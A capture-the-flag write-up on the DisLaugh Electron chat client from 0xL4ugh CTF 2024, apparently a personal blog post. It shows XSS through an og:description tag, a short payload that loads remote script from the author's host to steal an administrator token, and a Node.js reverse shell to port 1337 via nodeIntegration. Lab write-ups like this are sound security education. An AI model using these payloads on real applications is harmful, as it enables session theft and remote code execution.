---
layout: post
title: DisLaugh | 0xL4ugh CTF 2024
tags: [desktop,xss,rce]
published: true
---
## Introduction
I participated in 0xL4ugh CTF 2024 last week with my team [thehackerscrew](https://ctftime.org/team/85618/). <br>
There is a detailed write-up for Dislaugh Desktop PT challenge, I 🩸 it and another three solves only so far.
![Chall CTFd](/media/challenge.png)
<br>

## Exploring the Application
Visitng the link provided in description we see it's static page for Download DisLaugh Client Application <br>

![Home Page](/media/home-page.png)<br>
We'll download [Windows Client](https://drive.google.com/file/d/1sKXkr0G7PhmJhWQGirRYdMcAUGOjP0QN/view?usp=sharing) then Install it. <br>

![Installing the Application](/media/Installing.png)
After the installation it will pop out a discord similar login screen<br>

![Login Screen](/media/login-screen.png)
We'll register new account first<br>

![Register Screen](/media/register-screen.png)

After registration it'll redirect us to Login Screen again.<br>
After log-in we'll see the Home Screen.

![Home Screen](/media/home-screen.png)

We have only one option to do, this plus sign is used in discord to create/join server.

![Join/Create Server](/media/create-join-server.png)

After we creating the server it will be appeard in the left bar, we can click on it to see what's in there

![Server Screen](/media/server-screen.png)

We can only Send Messages and Copy The Invite code 

![Server Screen](/media/invite-code.png)

## Under The Hood

Right Click on the DisLaugh shortcut it will show us the installation location.<br>
It will be found at `C:\Users\{USERNAME}\AppData\Local\Programs\dislaugh`

![Install Location](/media/install-location.png)

We see here it's probably the application written in ElectronJS, so we can get the source code from resources/app.asar <br>

What is app.asar? app.asar is ASAR archive contains the source code for the application.<br>

We'll use [asar](https://github.com/electron/asar) utility to extract the contents of app.asar

![Asar Contents](/media/unpacking_app_asar.png)

We'll use any online js beautifier to make the js code more comfortable

We'll skip the boring parts in app.js but we'll keep only in mind

 ```js
 webPreferences: {
            nodeIntegration: !0,
            contextIsolation: !1,
            enableRemoteModule: !0,
            preload: path.join(__dirname, "preload_dash.js")
                }        
```
In `/templates/assets/js` we have <br>
alert.js : Responsible of Push Notifications <br>
auth.js : Responsible for handle login/register stuff<br>
dash-events.js : Responsible for listen for all events in dashboard and route it to the right function<br>
dashboard.js : Contains all functions <br>
jquery-3.7.1.min.js & socket.io.min.js <br>

We're interested in the juicy file that's contain many function ( `dashboard.js` ), I checked many functions but it seems fine for me, Suddenly this function caught my attention

```js
    addLink = (e, a, t, r, s = !1) => {
        var n = $('<div class="msg-container"></div>'),
            i = $('<div class="msg-author-icon"></div>');
        i.text(getUserIcon(r)), n.append(i);
        var o = $('<div class="msg-body"></div>'),
            d = $('<div class="msg-author-name"></div>');
        d.text(r);
        var v = $('<a href="" class="msg-link"></a>');
        v.text(e), v.attr("href", "#"), o.append(d), o.append(v);
        var c = $('<div class="msg-link-metadata"></div>'),
            p = $('<a href="" class="msg-link-title"></a>');
        p.text(a), p.attr("href", "#");
        var l = $('<div class="msg-link-desc"></div>');
        if (l.append(t), c.append(p), c.append(l), s) {
            var m = $('<img src="" class="msg-link-img">');
            m.attr("src", s), c.append(m)
        }
        o.append(c), n.append(o), $(".chat-container").append(n)
    },

```
Especially 
`if (l.append(t), c.append(p), c.append(l), s) {`
<br>
It's using jquery.append() for user-supplied input which is vulnerable to XSS
<br> Back for dash-events.js to see this function event listener

```js
    })).on("message", n => {
        console.log("Message received:", n), "text" == n.type ? addMessage(n.msg, n.author) : addLink(n.link, n.title, n.description, n.author, n.img), ScrollToEnd()
    }), socket.on("error", n => {
        pushErrorNotify("DisLaugh", n)
    })

```

We'll see it's listens when the WebSocket send the event `message` it uses [ternary operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Conditional_operator) 
to check the type of the message<br>
If the type is text it'll call addMessage with two paramaters otherwise it'll call addLink with five paramaters <br>
We'll try to send two messages

![Test Messages](/media/test_messages.png)

Let's take a look from the API directly

![Test Messages but from API](/media/messages-api.png)

it looks like the backend decide the message is text or link because I can't see anywhere I can't control the type nor anything, so the server fetch the content and decide internally it's text or link.
<br>

We need to know where is `t` in `l.append(t)` coming from, it's the third paramater in the function declaration in `dashboard.js` and function calling in `dash-events.js` <br>
So the vulnerable input is the `description`, so we can control the description on our website from `og:description` tag <br>
We'll try a simple function to test the XSS
```html
<html>
        <head>
            <meta property="og:title" content="Controlled Website">
            <meta property="og:author" content="omakmoh">
            <meta property="og:url" content="https://omakmoh.me/">
            <meta property="og:image" content="logo.png">
            <meta property="og:description" content="<script>alert(1)</script>">
        </head>
        <body></body>
</html>
```
Host the html file and send it in the channel

![Alert Test](/media/alert-test.png)

BoOoOoM XSS xD 

Back to website, we'll see a tab called help ![Help Page](/media/help-page.png)

It looks like we enter the invite code and an administrator visit our server, Maybe the flag in a private server? Let's try to steal the administrator token<br>

We'll use `sendMessage` from `dashboard.js`

```js
sendMessage = async (e, a) => {
        var t = await fetch(BASE_URL + "/messages", {
                method: "POST",
                headers: {
                    authorization: token,
                    "content-type": "application/json"
                },
                body: JSON.stringify({
                    sid: e,
                    message: a
                })
            }),
            r = await t.json();
        return 201 == t.status
    }
```
The function takes two paramaters<br>
e = The server to which you want to send a message <br>
a = The message


It will be `sendMessage(activeServer,token)` <br>
both variables is declared in `dashboard.js` 

We'll replace `alert(1)` with `sendMessage(activeServer,token)` and send it again in the channel

![sendMessage Function](/media/test-sendmessage.png)

The payload is cropped? It looks like there's a limit for the description, if we count the characters it'll be 30 character and the rest is removed and replaced by `...` <br>

Quick search I came across this [blog by TrustedSec](https://trustedsec.com/blog/cross-site-smallish-scripting-xsss) and found a short payload <br> `<script src=http:omakmoh.me/x>` that is match our 30 character limit,
We'll replace it and create `x` file with the `sendMessage` on our webserver <br>
Create new server ( We do not want to disturb the administrator due to alerts ) and send the link.
Take the invite code and submit it to help page.

![Admin Token](/media/admin-cookie.png)

We now have the administrator token, let's try to replace our token with administrator token in localStorage ( CTRL + SHIFT + I ) and refresh the application ( CTRL + R ) <br>

![Disappointment](/media/disappointment.png) We didn't found anything, We created this server to check if we in the right account.

Oh wait, do we remember `nodeIntegration` in app.js ?
the value was `!0` that's means true, So if we have XSS we can get RCE <br>

`nodeIntergration` means Intergerate Node.js features to be accessible directly from your page scripts <br>

We'll use ready-to-go reverse shell from [revshells.com](https://www.revshells.com/node.js%20%232?ip=omakmoh.me&port=1337&shell=cmd&encoding=cmd) Copy the nodejs code and place it `x` file

We'll send the link again in the channel, then we have to listen for incoming connections on port 1337 using `nc -nlvp 1337` <br>

Now for the final step we have to invite the administrator again.

![flag](/media/flag.png)

We finally got reverse shell and flag. <br>


Kudos to [DarkT](https://www.linkedin.com/in/darkt/) for writing such a great challenge!

<br>Follow me on [X ( previously Twitter )](https://twitter.com/omakmoh)
